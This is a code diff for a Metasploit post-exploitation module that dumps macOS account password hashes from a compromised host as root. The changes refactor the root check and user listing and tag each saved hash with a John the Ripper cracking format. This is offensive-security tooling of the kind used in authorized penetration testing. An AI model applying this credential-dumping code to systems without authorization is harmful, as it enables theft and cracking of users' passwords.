@@ -8,9 +8,11 @@ require 'rexml/document'
 
 class MetasploitModule < Msf::Post
   # set of accounts to ignore while pilfering data
-  OSX_IGNORE_ACCOUNTS = ["Shared", ".localized"]
+  #OSX_IGNORE_ACCOUNTS = ["Shared", ".localized"]
 
   include Msf::Post::File
+  include Msf::Post::OSX::Priv
+  include Msf::Post::OSX::System
   include Msf::Auxiliary::Report
 
   def initialize(info={})
@@ -38,10 +40,13 @@ class MetasploitModule < Msf::Post
 
   # Run Method for when run command is issued
   def run
-    fail_with(Failure::BadConfig, "Insufficient Privileges: must be running as root to dump the hashes") unless root?
+    unless is_root?
+      fail_with(Failure::BadConfig, 'Insufficient Privileges: must be running as root to dump the hashes')
+    end
 
     # iterate over all users
-    users.each do |user|
+    get_nonsystem_accounts.each do |user_info|
+      user = user_info['name']
       next if datastore['MATCHUSER'].present? and datastore['MATCHUSER'] !~ user
       print_status "Attempting to grab shadow for user #{user}..."
       if gt_lion? # 10.8+
@@ -170,14 +175,26 @@ class MetasploitModule < Msf::Post
     when "NT"
       private_data = "#{Metasploit::Credential::NTLMHash::BLANK_LM_HASH}:#{hash}"
       private_type = :ntlm_hash
+      jtr_format = 'ntlm'
     when "LM"
       private_data = "#{hash}:#{Metasploit::Credential::NTLMHash::BLANK_NT_HASH}"
       private_type = :ntlm_hash
-    when "SHA-512 PBKDF2", "SHA-512", "SHA-1"
+      jtr_format = 'lm'
+    when "SHA-512 PBKDF2"
       private_data = hash
       private_type = :nonreplayable_hash
+      jtr_format = 'PBKDF2-HMAC-SHA512'
+    when "SHA-512"
+      private_data = hash
+      private_type = :nonreplayable_hash
+      jtr_format = 'sha512,crypt'
+    when "SHA-1"
+      private_data = hash
+      private_type = :nonreplayable_hash
+      jtr_format = 'sha1'
     end
     create_credential(
+      jtr_format: jtr_format,
       workspace_id: myworkspace_id,
       origin_type: :session,
       session_id: session_db_id,
@@ -189,12 +206,6 @@ class MetasploitModule < Msf::Post
     print_status("Credential saved in database.")
   end
 
-  # Checks if running as root on the target
-  # @return [Bool] current user is root
-  def root?
-    whoami == 'root'
-  end
-
   # @return [String] containing blob for ShadowHashData in user's plist
   # @return [nil] if shadow is invalid
   def grab_shadow_blob(user)
@@ -204,18 +215,8 @@ class MetasploitModule < Msf::Post
     shadow_bytes.sub!(/^dsAttrTypeNative:ShadowHashData:/, '')
   end
 
-  # @return [Array<String>] list of user names
-  def users
-    @users ||= cmd_exec("/bin/ls /Users").each_line.collect.map(&:chomp) - OSX_IGNORE_ACCOUNTS
-  end
-
   # @return [String] version string (e.g. 10.8.5)
   def ver_num
-    @version ||= cmd_exec("/usr/bin/sw_vers -productVersion").chomp
-  end
-
-  # @return [String] name of current user
-  def whoami
-    @whoami ||= cmd_exec('/usr/bin/whoami').chomp
+    @product_version ||= get_sysinfo['ProductVersion']
   end
 end
